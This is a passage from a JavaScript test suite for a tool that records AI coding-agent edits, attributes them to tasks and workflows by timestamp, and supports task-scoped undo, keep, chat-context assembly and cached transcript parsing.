  const { m: filtered } = build('ntf', [wrapper, toolResult, userMsg]);
  assert.equal(filtered.summary.title, 'Fix the login flow so sessions persist', 'skips harness wrappers and tool_result turns to find the real prompt');

  // --- a ts===0 edit (no timestamp) is unassigned even alongside a real plan ---
  const cwd0 = tmpWork();
  const proj0 = core.projectDir(cwd0);
  fs.mkdirSync(proj0, { recursive: true });
  core.ensureStore('nt0');
  const b0 = core.writeBlob('nt0', Buffer.from('a\n'));
  const a0 = core.writeBlob('nt0', Buffer.from('a\nb\n'));
  core.appendLog('nt0', { ts: 0, tool: 'Edit', file: path.join(cwd0, 'zero.ts'), beforeBlob: b0, afterBlob: a0, status: 'pending' });
  const snap0 = JSON.stringify({ timestamp: new Date(1000).toISOString(), message: { role: 'assistant', content: [
    { type: 'tool_use', id: 't1', name: 'TodoWrite', input: { todos: [{ content: 'Real task', status: 'in_progress' }] } }] } });
  fs.writeFileSync(path.join(proj0, 'nt0.jsonl'), snap0);
  const m0 = core.buildChangeMap(cwd0, 'nt0', { root: cwd0 });
  assert.equal(m0.edits[0].taskId, null, 'a timestamp-less edit can\'t be placed in a strict interval → unassigned');
  assert.ok(m0.rollupByTask.some((r) => r.taskId === null && r.edits === 1), 'the explicit unassigned bucket claims it');
});

test('observations: buildObservations coalesces 3 consecutive same-file edits into ONE ×3 run (0.8.0 r2)', () => {
  freshHome();
  const S = 'obs-coalesce';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), ''); // transcript must exist (findTranscript)
  const F = path.join(cwd, 'coalesce.ts');
  const id1 = seedEdit(S, F, 'a\n', 'a\nb\n'); // +1
  const id2 = seedEdit(S, F, 'a\nb\n', 'a\nb\nc\n'); // +1
  const id3 = seedEdit(S, F, 'a\nb\nc\n', 'a\nb\nc\nd\n'); // +1

  const obs = core.buildObservations(cwd, S, { root: cwd });
  const runs = obs.runs.filter((r) => r.file === F);
  assert.equal(runs.length, 1, 'three consecutive same-file edits collapse into ONE run');
  const run = runs[0];
  assert.equal(run.count, 3, 'count is the ×N (=3)');
  assert.equal(run.edits.length, 3, 'the run carries all three per-edit rows for drill-down');
  assert.deepEqual(run.edits.map((e) => e.id).sort((a, b) => a - b), [id1, id2, id3], 'each row carries its edit id');
  assert.equal(run.added, 3, 'combined + across the run (one added line each)');
  assert.equal(run.removed, 0, 'combined − across the run');
  assert.ok(run.edits.every((e) => e.status === 'pending'), 'each row carries its review status');
  assert.ok(run.edits.every((e) => 'ts' in e && 'reasoning' in e), 'each row carries ts + reasoning for drill-down');
});

test('workflows: workflow→edit attribution by ts-window; ambiguous overlap → null (0.8.0 r2)', () => {
  freshHome();
  const S = 'wf-attr';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), ''); // main transcript exists
  const T = 1_700_000_000_000; // ms epoch (toMs passes >1e12 through unchanged)
  // Two workflow runs, each with one agent whose tool_uses bracket a ts-window:
  //   wf_one: [T+1000, T+2000] ; wf_two: [T+1500, T+2500]  → they OVERLAP on [T+1500, T+2000].
  const wfRoot = path.join(proj, S, 'subagents', 'workflows');
  const mkAgent = (wfId, agentId, t0, t1) => {
    const dir = path.join(wfRoot, wfId);
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      path.join(dir, `agent-${agentId}.jsonl`),
      [
        { timestamp: t0, message: { role: 'assistant', content: [{ type: 'tool_use', id: agentId + '1', name: 'Edit', input: { file_path: '/x.ts' } }] } },
        { timestamp: t1, message: { role: 'assistant', content: [{ type: 'tool_use', id: agentId + '2', name: 'Edit', input: { file_path: '/x.ts' } }] } },
      ].map((o) => JSON.stringify(o)).join('\n')
    );
  };
  mkAgent('wf_one', 'aa', T + 1000, T + 2000);
  mkAgent('wf_two', 'bb', T + 1500, T + 2500);

  // Four distinct-file store edits at controlled timestamps (distinct files → no tree collapse).
  core.ensureStore(S);
  const mk = (file, ts) => {
    const id = core.nextId(S);
    const b = core.writeBlob(S, Buffer.from(file + '\n'));
    core.appendLog(S, { id, ts, tool: 'Edit', file, beforeBlob: null, afterBlob: b, status: 'pending' });
    return id;
  };
  const e1 = mk(path.join(cwd, 'w1.ts'), T + 1200); // wf_one only
  const e2 = mk(path.join(cwd, 'w2.ts'), T + 2300); // wf_two only
  const e3 = mk(path.join(cwd, 'w3.ts'), T + 1800); // in BOTH windows → ambiguous → null
  const e4 = mk(path.join(cwd, 'w4.ts'), T + 9000); // in NO window → null

  const m = core.buildChangeMap(cwd, S, { root: cwd });
  const wid = (id) => m.edits.find((e) => e.id === id).workflowId;
  assert.equal(m.edits.length, 4, 'four distinct edits, none collapsed');
  assert.equal(wid(e1), 'wf_one', 'ts inside wf_one only → wf_one');
  assert.equal(wid(e2), 'wf_two', 'ts inside wf_two only → wf_two');
  assert.equal(wid(e3), null, 'ts inside BOTH workflows → ambiguous → null (never guessed)');
  assert.equal(wid(e4), null, 'ts inside NO window → null');

  // (D) workflows[] Overview tabs: one entry per workflow that produced attributed edits.
  assert.deepEqual(m.workflows.map((w) => w.id).sort(), ['wf_one', 'wf_two'], 'one tab per workflow with attributed edits (ambiguous/none excluded)');
  const one = m.workflows.find((w) => w.id === 'wf_one');
  assert.equal(one.rollup.edits, 1, 'wf_one rolls up its single attributed edit');
  assert.equal(one.rollup.pending, 1, 'and carries its review status');
  assert.deepEqual(one.files.map((f) => f.file), ['w1.ts'], 'wf_one files: its touched file(s), churn-desc');

  // rollupByWorkflow: per-workflow rows + an EXPLICIT null bucket (ambiguous + unwindowed), null-last.
  const rw = m.rollupByWorkflow;
  assert.ok(rw.find((r) => r.workflowId === 'wf_one') && rw.find((r) => r.workflowId === 'wf_two'), 'both workflows rolled up');
  const un = rw.find((r) => r.workflowId === null);
  assert.ok(un && un.edits === 2, 'the ambiguous (e3) + unwindowed (e4) edits collect in the null bucket');
  assert.equal(rw[rw.length - 1].workflowId, null, 'the null bucket sorts last');
  assert.equal(rw.reduce((n, r) => n + r.edits, 0), m.edits.length, 'rollupByWorkflow conserves the edit count');
});

// --- S7 (0.8.0): cross-agent task log + task-scoped keep/undo (taskLog.ts, undo.ts) --------------
// Reuses the S2/S3 git-free worktree fixtures and the S6 to-do timeline. STRICT-span attribution only:
// an edit in no real in_progress interval is `unassigned` and is excluded from task rows / undo sets.

test('taskLog: crossAgentTaskLog unions one logical task across two worktree siblings into one row', () => {
  freshHome();
  const base = tmpWork();
  // Main working tree (dir-.git) + a linked worktree (file-.git → shared commondir) = ONE repo group.
  const main = path.join(base, 'main');
  const gitDir = path.join(main, '.git');
  const admin = path.join(gitDir, 'worktrees', 'wtA');
  fs.mkdirSync(admin, { recursive: true });
  fs.writeFileSync(path.join(gitDir, 'config'), BARE_FALSE);
  fs.writeFileSync(path.join(admin, 'commondir'), '../..\n');
  const wtA = path.join(base, 'wtA');
  fs.mkdirSync(wtA);
  fs.writeFileSync(path.join(wtA, '.git'), `gitdir: ${admin}\n`);
  assert.equal(core.commonDir(main), core.commonDir(wtA), 'sanity: main + wtA are one repo');

  // Both agents work the SAME logical task — identical to-do text hashes to the SAME taskId (§S6). The
  // to-do is in_progress across [500, 1500); an edit at ts=1000 lands inside it, one at ts=2000 does not.
  const TASK = 'Wire the exporter';
  const MAIN = 's7-main', WTA = 's7-wta';
  const transcript = (cwd, id, branch) => [
    { type: 'user', cwd, sessionId: id, gitBranch: branch }, // first cwd-bearing line (listRepoSiblings keys on it)
    { timestamp: new Date(500).toISOString(), message: { role: 'assistant', content: [
      { type: 'tool_use', id: 't1', name: 'TodoWrite', input: { todos: [{ content: TASK, status: 'in_progress' }] } }] } },
    { timestamp: new Date(1500).toISOString(), message: { role: 'assistant', content: [
      { type: 'tool_use', id: 't2', name: 'TodoWrite', input: { todos: [{ content: TASK, status: 'completed' }] } }] } },
  ].map((o) => JSON.stringify(o)).join('\n') + '\n';
  const seedTranscript = (cwd, id, branch) => {
    const dir = core.projectDir(cwd);
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, id + '.jsonl'), transcript(cwd, id, branch));
  };
  seedTranscript(main, MAIN, 'main');
  seedTranscript(wtA, WTA, 'feat/x');

  seedEdit(MAIN, path.join(main, 'a.ts'), null, 'x\n'); // #1 ts=1000 → inside the task span
  seedEdit(MAIN, path.join(main, 'a2.ts'), null, 'z\n'); // #2 ts=2000 → AFTER the task closed → unassigned
  seedEdit(WTA, path.join(wtA, 'b.ts'), null, 'y\n'); // #1 ts=1000 → inside the task span (the OTHER worktree)

  const rows = core.crossAgentTaskLog(main);
  assert.equal(rows.length, 1, 'one logical task across two worktrees folds into ONE row (unassigned edit excluded)');
  const row = rows[0];
  assert.equal(row.taskId, core.taskId(TASK, 0), 'keyed by the stable content-hash taskId');
  assert.equal(row.content, TASK, 'the to-do text is carried onto the task row');
  assert.deepEqual(row.agentIds, [MAIN, WTA].sort(), 'both worktree sessions contributed → both agents named');
  assert.deepEqual(row.subagentIds, [], 'no subagents authored these edits');
  assert.equal(row.edits, 2, 'exactly the two in-interval edits (one per worktree); the unassigned edit is NOT counted');
  assert.equal(row.added, 2, '+1 line per contributing edit');
  assert.equal(row.removed, 0);
  assert.equal(row.status, 'pending', 'all contributing edits are pending → the task reads pending');
});

// A single-session fixture: transcript puts `task` in_progress across [500, 2500). Seeds three edits at
// ts 1000/2000/3000 — the third lands AFTER the task completes, so it belongs to NO strict interval.
function seedTaskSession(S, task) {
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const rec = [
    { type: 'user', cwd, sessionId: S, gitBranch: 'main' },
    { timestamp: new Date(500).toISOString(), message: { role: 'assistant', content: [
      { type: 'tool_use', id: 't1', name: 'TodoWrite', input: { todos: [{ content: task, status: 'in_progress' }] } }] } },
    { timestamp: new Date(2500).toISOString(), message: { role: 'assistant', content: [
      { type: 'tool_use', id: 't2', name: 'TodoWrite', input: { todos: [{ content: task, status: 'completed' }] } }] } },
  ].map((o) => JSON.stringify(o)).join('\n') + '\n';
  fs.writeFileSync(path.join(proj, S + '.jsonl'), rec);
  const F1 = path.join(cwd, 'f1.ts'), F2 = path.join(cwd, 'f2.ts'), F3 = path.join(cwd, 'f3.ts');
  fs.writeFileSync(F1, 'a2\n'); fs.writeFileSync(F2, 'b2\n'); fs.writeFileSync(F3, 'c2\n'); // on-disk = each edit's `after`
  const id1 = seedEdit(S, F1, 'a1\n', 'a2\n'); // ts 1000 — inside [500,2500)
  const id2 = seedEdit(S, F2, 'b1\n', 'b2\n'); // ts 2000 — inside
  const id3 = seedEdit(S, F3, 'c1\n', 'c2\n'); // ts 3000 — AFTER the task completed → unassigned
  return { cwd, S, taskId: core.taskId(task, 0), ids: [id1, id2, id3], files: [F1, F2, F3] };
}

test('undo: task revert is STRICT — exactly the real in_progress interval, never a gap fill (0.8.8)', () => {
  freshHome();
  const f = seedTaskSession('s7-undo', 'Task A');
  const [id1, id2, id3] = f.ids;
  assert.deepEqual([id1, id2, id3], [1, 2, 3], 'serial ids, ts = id*1000');

  // The strict set: #3 (ts 3000 > completed 2500) is outside the real interval.
  const strict = core.taskEditIds(f.cwd, f.S, f.taskId).sort((a, b) => a - b);
  assert.deepEqual(strict, [id1, id2], 'taskEditIds: only edits inside the real in_progress interval');
  const m = core.buildChangeMap(f.cwd, f.S, { root: f.cwd });
  assert.equal(m.edits.find((e) => e.id === id3).taskId, null, 'strict attribution: the trailing edit is honestly unassigned');

  // Task revert acts on the strict set and NOTHING else: a trailing edit the task never owned stays put.
  const res = core.undoTask(f.cwd, f.S, f.taskId);
  assert.equal(res.undone, 2, 'exactly the strict set reverted');
  assert.deepEqual(res.ids.sort((a, b) => a - b), [id1, id2], 'never the trailing gap edit');
  assert.equal(fs.readFileSync(f.files[0], 'utf8'), 'a1\n', '#1 reverted to its pre-edit state');
  assert.equal(fs.readFileSync(f.files[1], 'utf8'), 'b1\n', '#2 reverted');
  assert.equal(core.findRecord('s7-undo', id3).status, 'pending', '#3 was never part of the task — untouched');
});

test('undo: keepTask accepts the STRICT task set — an unowned edit is never swept in (0.8.8)', () => {
  freshHome();
  const f = seedTaskSession('s7-keep', 'Task K');
  const [id1, id2, id3] = f.ids;
  const res = core.keepTask(f.cwd, f.S, f.taskId);
  assert.equal(res.kept, 2, 'the strict set is kept');
  assert.equal(res.total, 2, 'total = the strict set');
  assert.deepEqual(res.ids.sort((a, b) => a - b), [id1, id2], 'exactly the strict set was kept');
  for (const id of [id1, id2]) assert.equal(core.findRecord('s7-keep', id).status, 'kept');
  assert.equal(core.findRecord('s7-keep', id3).status, 'pending', 'the trailing gap edit stays pending — it was never this task\'s');
});

test('changemap: TaskCreate/TaskUpdate tasks get STRICT attribution + the Tasks-tab taskId join + TodoWrite dedupe', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'tasklink';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  core.ensureStore(S);
  const seedAt = (file, before, after, ts) => {
    const b = core.writeBlob(S, Buffer.from(before));
    const a = core.writeBlob(S, Buffer.from(after));
    return core.appendLog(S, { ts, tool: 'Edit', file, beforeBlob: b, afterBlob: a, status: 'pending' }).id;
  };
  const F = (n) => path.join(cwd, `t${n}.py`);
  seedAt(F(1), 'a\n', 'a\nb\n', 500); // before the first flip → back-extends onto task #1
  seedAt(F(2), 'a\n', 'a\nc\n', 1500); // inside #1's span
  seedAt(F(3), 'a\n', 'a\nd\n', 3500); // inside #2's span
  const tu = (ts, blocks) => JSON.stringify({ timestamp: new Date(ts).toISOString(), message: { role: 'assistant', content: blocks } });
  const tr = (ts, tuid, text) => JSON.stringify({ type: 'user', timestamp: new Date(ts).toISOString(), message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: tuid, content: text }] } });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), [
    tu(900, [{ type: 'tool_use', id: 'c1', name: 'TaskCreate', input: { subject: 'Wire the reader', description: 'core reader', activeForm: 'Wiring the reader' } }]),
    tr(950, 'c1', 'Task #1 created successfully: Wire the reader'),
    tu(960, [{ type: 'tool_use', id: 'c2', name: 'TaskCreate', input: { subject: 'Render the tab' } }]),
    tr(970, 'c2', 'Task #2 created successfully: Render the tab'),
    tu(1000, [{ type: 'tool_use', id: 'u1', name: 'TaskUpdate', input: { taskId: '1', status: 'in_progress' } }]),
    tu(3000, [
      { type: 'tool_use', id: 'u2', name: 'TaskUpdate', input: { taskId: '1', status: 'completed' } },
      { type: 'tool_use', id: 'u3', name: 'TaskUpdate', input: { taskId: '2', status: 'in_progress' } },
    ]),
    tu(4000, [{ type: 'tool_use', id: 'u4', name: 'TaskUpdate', input: { taskId: '2', status: 'completed' } }]),
    // The demo plans BOTH ways: a TodoWrite naming the same title must NOT mint a twin task.
    tu(4100, [{ type: 'tool_use', id: 'td', name: 'TodoWrite', input: { todos: [{ content: 'Wire the reader', status: 'completed' }] } }]),
  ].join('\n'));
  const cm = core.buildChangeMap(cwd, S, { root: cwd });
  // The merged plan (tasks ∪ todos, todos winning duplicate titles) feeds ONE strict identity per title.
  const byContent = new Map(cm.tasks.map((t) => [t.content, t]));
  assert.equal(byContent.size, cm.tasks.length, 'no twin tasks — todos win duplicate titles in the merged plan');
  const t1 = byContent.get('Wire the reader');
  const t2 = byContent.get('Render the tab');
  assert.ok(t1 && t2, 'both TaskCreate subjects hold strict identities');
  const roll = new Map(cm.rollupByTask.map((r) => [r.taskId, r]));
  assert.equal(roll.get(t1.taskId).edits, 1, 'task #1 strictly claims its in-span edit (the ts-500 head edit is unassigned)');
  assert.equal(roll.get(t2.taskId).edits, 1, 'task #2 strictly claims its in-span edit');
  assert.ok(roll.get(null) && roll.get(null).edits === 1, 'the pre-first-flip edit lands in the explicit unassigned bucket');
  assert.deepEqual(core.taskEditIds(cwd, S, t1.taskId), [2], 'taskEditIds resolves the same strict set');
  // The tab join: rows come from transcript HISTORY (no task dir exists) with the strict taskId.
  const rows = core.sessionTaskRows(cwd, S);
  assert.deepEqual(rows.map((r) => r.id), ['2', '1'], 'history mined from the transcript, NEWEST first');
  assert.equal(rows[1].taskId, t1.taskId, 'taskIdForSubject joins the tab row to rollupByTask');
  assert.equal(rows[1].activeForm, 'Wiring the reader');
});

// --- S8: zero-token chat-context assembler (§2.6/§7) ---

/** A store edit + a transcript (Edit reasoning, a Bash command+result, an in_progress TodoWrite) so one
 *  fixture exercises every assembleChatContext ref path. Returns cwd/session + the taskId of the todo. */
function seedChatContext(session) {
  const cwd = tmpWork();
  const S = session;
  const F = path.join(cwd, 'app.ts');
  core.ensureStore(S);
  const before = core.writeBlob(S, Buffer.from('const a = 1\n'));
  const after = core.writeBlob(S, Buffer.from('const a = 2\n'));
  core.appendLog(S, { ts: 1000, tool: 'Edit', file: F, beforeBlob: before, afterBlob: after, status: 'pending' }); // #1
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const tx = [
    { timestamp: '2026-07-13T10:00:00.000Z', message: { role: 'assistant', content: [
      { type: 'text', text: 'Bumping the constant from 1 to 2.' },
      { type: 'tool_use', id: 'tu-edit', name: 'Edit', input: { file_path: F } },
    ] } },
    { timestamp: '2026-07-13T10:01:00.000Z', message: { role: 'assistant', content: [
      { type: 'text', text: 'Running the test suite.' },
      { type: 'tool_use', id: 'tu-bash', name: 'Bash', input: { command: 'npm test --silent', description: 'run tests' } },
    ] } },
    { message: { role: 'user', content: [
      { type: 'tool_result', tool_use_id: 'tu-bash', is_error: false, content: 'PASS 3 tests, 0 failures' },
    ] } },
    { timestamp: '2026-07-13T10:02:00.000Z', message: { role: 'assistant', content: [
      { type: 'tool_use', id: 'tu-todo', name: 'TodoWrite', input: { todos: [{ content: 'Refactor the parser', status: 'in_progress' }] } },
    ] } },
  ].map((o) => JSON.stringify(o)).join('\n');
  fs.writeFileSync(path.join(proj, S + '.jsonl'), tx);
  return { cwd, S, taskId: core.taskId('Refactor the parser', 0) };
}

test('assembleChatContext: edit ref carries the before/after blobs + Claude’s reasoning (zero token)', () => {
  freshHome();
  const { cwd, S } = seedChatContext('s8-edit');
  // by editId
  const p = core.assembleChatContext(cwd, S, { editId: 1 });
  assert.match(p, /--- before ---/, 'has a before section');
  assert.match(p, /--- after ---/, 'has an after section');
  assert.match(p, /const a = 1/, 'before blob content present');
  assert.match(p, /const a = 2/, 'after blob content present');
  assert.match(p, /Bumping the constant from 1 to 2\./, "carries Claude's own reasoning for the edit");
  assert.match(p, /edit #1|app\.ts/, 'names the edited file/record');
  // the same edit, referenced by its stable toolUseId, resolves the same store record → same before/after
  const p2 = core.assembleChatContext(cwd, S, { toolUseId: 'tu-edit' });
  assert.match(p2, /const a = 1/, 'toolUseId path also finds the before blob');
  assert.match(p2, /const a = 2/, 'toolUseId path also finds the after blob');
});

test('assembleChatContext: exec (action) ref carries the command + its result (zero token)', () => {
  freshHome();
  const { cwd, S } = seedChatContext('s8-exec');
  const p = core.assembleChatContext(cwd, S, { toolUseId: 'tu-bash' });
  assert.match(p, /--- command ---/, 'has a command section');
  assert.match(p, /npm test --silent/, 'the shell command is present');
  assert.match(p, /--- result ---/, 'has a result section');
  assert.match(p, /PASS 3 tests, 0 failures/, 'the tool_result output is present');
  assert.match(p, /Running the test suite\./, "carries Claude's reasoning for the command");
  assert.doesNotMatch(p, /--- before ---/, 'an exec is not framed as an edit (no before/after)');
});

test('assembleChatContext: task ref frames the prompt with the task (resolved from its stable taskId)', () => {
  freshHome();
  const { cwd, S, taskId } = seedChatContext('s8-task');
  // task ref alone → the header names the task by its resolved content, not the opaque hash
  const solo = core.assembleChatContext(cwd, S, { taskId });
  assert.match(solo, /task/i, 'frames the prompt as a task');
  assert.match(solo, /Refactor the parser/, 'resolves the taskId hash back to the todo content');
  assert.doesNotMatch(solo, new RegExp(taskId), 'shows the content, not the raw hash');
  // task + subagent framing layered onto a primary action → "part of task X run by subagent Y"
  const framed = core.assembleChatContext(cwd, S, { toolUseId: 'tu-edit', taskId, agentId: 'ag7' });
  assert.match(framed, /part of task "Refactor the parser" run by subagent ag7/, 'layers task + subagent framing on the action');
  // an unknown taskId degrades honestly to the raw ref (never invents a task name)
  const unknown = core.assembleChatContext(cwd, S, { taskId: 'deadbeef0000' });
  assert.match(unknown, /deadbeef0000/, 'an unresolvable taskId is surfaced verbatim, not guessed');
});

test('assembleChatContext: NEVER spawns a process or calls a model (zero-token guarantee)', () => {
  freshHome();
  const { cwd, S, taskId } = seedChatContext('s8-nospawn');
  // Trip-wire every child_process entry point: assembling context must not exec/spawn anything
  // (it must not reach analyze.ts's `claude -p`). Restored in finally so later tests are unaffected.
  const methods = ['spawn', 'spawnSync', 'exec', 'execSync', 'execFile', 'execFileSync', 'fork'];
  const orig = {};
  for (const m of methods) {
    orig[m] = cp[m];
    cp[m] = () => {
      throw new Error(`assembleChatContext spawned a process via child_process.${m}`);
    };
  }
  try {
    for (const ref of [{ editId: 1 }, { toolUseId: 'tu-edit' }, { toolUseId: 'tu-bash' }, { taskId }, { agentId: 'ag7' }, {}]) {
      const out = core.assembleChatContext(cwd, S, ref);
      assert.equal(typeof out, 'string', 'returns a prompt string');
      assert.ok(out.length > 0, 'the prompt is non-empty');
    }
  } finally {
    for (const m of methods) cp[m] = orig[m];
  }
});

// ── S9 — core barrel: every new 0.8.0 public symbol is reachable via the single `core` backend ──
// Guards the CLI-as-single-backend contract: the CLI + both editors consume aggregation exclusively
// through `core.*`, so a module dropped from index.ts (or a public symbol quietly made private) is a
// silent parity break. This test pins the reachable public surface introduced by S1-S8.
test('barrel: index.ts re-exports every new 0.8.0 public symbol (CLI-as-single-backend)', () => {
  // Runtime-checkable values (functions). Types (Phase, FileCollision, SiblingSession, TaskLogEntry,
  // ChatContextRef, TaskRoll/SubagentRoll/AgentRoll, KeepScopeResult, …) are compile-time only and
  // are surfaced by `export *` in index.d.ts — the CLI/vscode builds under `npm test` are the check
  // that they resolve, so a missing type turns the build red rather than passing silently here.
  const publicFns = [
    // S2 — git-free worktree resolver (session.ts)
    'repoRoot', 'commonDir', 'repoKeyForSession', 'firstCwdLine',
    // S3 — repo-scoped siblings + conflicts (fleet.ts)
    'listRepoSiblings', 'fleetConflicts',
    // S4 — live phase + subagent todos (actions.ts / subagents.ts)
    'agentPhase', 'agentPhaseDetail', 'subagentTodos',
    // S5 — hardened subagent editId linker (actions.ts)
    'attributeEditIds',
    // S6 — stable taskId (strict spans) + three-level rollups (changemap.ts)
    'taskId', 'rollupByTask', 'rollupBySubagent', 'rollupByAgent',
    // S7 — cross-agent task-log + task-scoped keep/undo (taskLog.ts / changemap.ts / undo.ts)
    'crossAgentTaskLog', 'taskEditIds', 'undoTask', 'keepTask',
    // S8 — zero-token chat-context assembler (actions.ts)
    'assembleChatContext',
    // 0.8.0 — panel consolidation: Observations view-model (observe.ts) + task-scoped clear (store.ts)
    'buildObservations', 'clearResolvedIds',
    // 0.8.0 — workflow-run tracking (workflows.ts)
    'parseWorkflows',
    // 0.8.0 r2 — workflow→edit attribution + per-workflow rollup (workflows.ts / changemap.ts)
    'workflowWindows', 'workflowForTs', 'rollupByWorkflow',
    // 0.8.6 — session vitals (metrics.ts), compaction primitives (actions.ts), footprint
    // (capabilities.ts), context sources (observe.ts), shared model labeller (format.ts)
    'sessionVitals', 'parseCompactLine', 'compactLabel', 'outsideReads', 'outsideWrites', 'contextSources', 'friendlyModel',
    // 0.8.8 — prompts (prompts.ts), fast session listing (observe.ts), the tab join (tasks.ts)
    'sessionPrompts', 'promptEditIds', 'promptResponse', 'summarizePrompts', 'sessionMeta', 'fastSessionTitle', 'taskIdForSubject',
    // 0.10.0 — the rewind boundary (prompts.ts) and the fleet-active predicate (fleet.ts)
    'checkpointScope', 'isFleetActive',
  ];
  const missing = publicFns.filter((k) => typeof core[k] !== 'function');
  assert.deepEqual(missing, [], `barrel is missing public symbol(s): ${missing.join(', ')}`);

  // The strict-span mechanics (inProgressSpansStrict / taskForTs) are INTENTIONALLY private (S6/S7):
  // the blueprint §2.1 designates inProgressSpansStrict an internal builder, and taskForTs exists only
  // as the module-private strictTaskForTs helper + a buildChangeMap closure. The PUBLIC strict-span
  // contract consumers need is exposed through taskEditIds / rollupByTask / ChangeMap.rollupByTask —
  // asserted present above. Pin the boundary so a refactor can't silently widen the public surface.
  for (const priv of ['inProgressSpansStrict', 'taskForTs', 'strictTaskForTs']) {
    assert.equal(core[priv], undefined, `${priv} is an internal helper — it must not leak onto the barrel`);
  }
});

// --- 0.8.0 stabilization: tracking-fix + perf-cache regression tests ------------------------------

test('fscache: a pure parse is memoized per (mtime,size) and invalidates when the file changes', () => {
  freshHome();
  const dir = tmpWork();
  const p = path.join(dir, 't.jsonl');
  fs.writeFileSync(p, JSON.stringify(asstToolUse('x1', 'Read', { file_path: '/a.ts' })) + '\n');
  const first = core.parseTranscriptActions(p, { includeSidechain: true });
  assert.equal(first.length, 1, 'one action parsed');
  // Same stamp → served from cache; the returned records are per-call COPIES, so a consumer that
  // mutates (attribution sets editId) can never poison the cached master.
  const second = core.parseTranscriptActions(p, { includeSidechain: true });
  second[0].editId = 999;
  const third = core.parseTranscriptActions(p, { includeSidechain: true });
  assert.equal(third[0].editId, undefined, 'a consumer mutation never leaks into the cached master');
  // Append a line (size changes) → the cache revalidates and re-parses.
  fs.appendFileSync(p, JSON.stringify(asstToolUse('x2', 'Read', { file_path: '/b.ts' })) + '\n');
  assert.equal(core.parseTranscriptActions(p, { includeSidechain: true }).length, 2, 'file change → fresh parse');
  core.clearFsCache(); // exported for long-lived hosts + hermetic tests
  assert.equal(core.parseTranscriptActions(p, { includeSidechain: true }).length, 2, 'still parses after an explicit clear');
});

test('fscache: one transcript is READ ONCE no matter how many derivations want it (read amplification)', () => {
  // The defect this guards: `cachedByFiles` memoizes derived VALUES per kind, so every kind still
  // missed once and each miss did its own `readFileSync(...).split('\n')` of the SAME transcript.
  // Measured on a real cold `views changemap` before the shared raw-text layer existed: 5,458 whole-file
  // reads over 2,085 paths, 1,739 MiB delivered for 482 MiB of unique bytes — 3.61x, with the biggest
  // transcripts opened 6-9 times each. Amplification is invisible to every other test in this file
  // because the OUTPUT is identical either way; only counting the reads can see it.
  freshHome();
  const cwd = tmpWork();
  const S = 'amplify';
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const tp = path.join(proj, S + '.jsonl');
  fs.writeFileSync(
    tp,
    [
      asstToolUse('a1', 'Read', { file_path: '/a.ts' }),
      asstToolUse('a2', 'TodoWrite', { todos: [{ content: 'ship it', status: 'in_progress' }] }),
      asstToolUse('a3', 'Bash', { command: 'echo hi', run_in_background: true }),
      asstToolUse('a4', 'Task', { description: 'go', subagent_type: 'general-purpose' }),
    ]
      .map((o) => JSON.stringify(o))
      .join('\n') + '\n'
  );

  // Count only FULL reads of the transcript; the bounded tail/head peeks (title scan, cwd scan) go
  // through openSync/readSync and are deliberately NOT routed through the shared layer.
  const realRead = fs.readFileSync;
  let reads = 0;
  fs.readFileSync = function (f, ...rest) {
    if (typeof f === 'string' && path.resolve(f) === path.resolve(tp)) reads++;
    return realRead.call(fs, f, ...rest);
  };
  // Six independent derivations, each of which owns its own `cachedByFiles` kind and each of which
  // used to open this file for itself. Run them through a helper so the positive control below drives
  // exactly the same work.
  const deriveAll = () => {
    core.parseTranscriptActions(tp, { includeSidechain: true }); // actions
    core.transcriptInsights(cwd, S); // insights + todos
    core.taskSnaps(cwd, S); // mined tasks
    core.parseSubagents(cwd, S); // subagent meta
    core.sessionProcesses(cwd, S); // background shells
    core.sessionPrompts(cwd, S); // asks + per-ask tokens
  };
  try {
    core.clearFsCache();
    deriveAll();
    const shared = reads;

    // POSITIVE CONTROL — the counter and the workload are real. Dropping the shared layer between
    // derivations is exactly the pre-fix world, and it MUST push the same six derivations over the
    // limit this test enforces; if it does not, the assertion below is vacuous and proves nothing.
    reads = 0;
    core.clearFsCache();
    core.parseTranscriptActions(tp, { includeSidechain: true });
    core.clearFsCache();
    core.transcriptInsights(cwd, S);
    core.clearFsCache();
    core.taskSnaps(cwd, S);
    core.clearFsCache();
    core.parseSubagents(cwd, S);
    core.clearFsCache();
    core.sessionProcesses(cwd, S);
    core.clearFsCache();
    core.sessionPrompts(cwd, S);
    const unshared = reads;

    assert.ok(unshared > 1, `positive control: without the shared layer the file is read ${unshared}x (must be >1, or this test cannot fail)`);
    assert.equal(shared, 1, `one process, ${unshared > 1 ? unshared : 'several'} derivations, ONE read of the transcript (got ${shared})`);
  } finally {
    fs.readFileSync = realRead;
    core.clearFsCache();
  }
});

test('fscache: the shared text layer serves current bytes to a derivation that has not run yet', () => {
  // The layer keys raw text on (mtimeMs, size, ino) — `ino` because the store rewrites log.jsonl and
  // every session-meta sidecar through tmp+rename, and a same-SIZE rewrite is invisible to a
  // (mtime, size) key whenever the filesystem clock is coarser than the gap between the two writes.
  //
  // The probe has to reach the TEXT layer, so it drives two derivations with DIFFERENT memo kinds over
  // one file: the second one's `cachedByFiles` entry does not exist, so it must compute — and what it
  // computes from is exactly the shared text this test is about.
  freshHome();
  const dir = tmpWork();
  const p = path.join(dir, 't.jsonl');
  const line = (id) => JSON.stringify(asstToolUse(id, 'Read', { file_path: '/a.ts' })) + '\n';
  fs.writeFileSync(p, line('aa1'));
  const T = new Date(1_600_000_000_000); // a whole-second stamp utimes can restore EXACTLY
  fs.utimesSync(p, T, T);
  assert.equal(core.parseTranscriptActions(p, { includeSidechain: true })[0].toolUseId, 'aa1');

  const st0 = fs.statSync(p);
  const tmp = p + '.tmp';
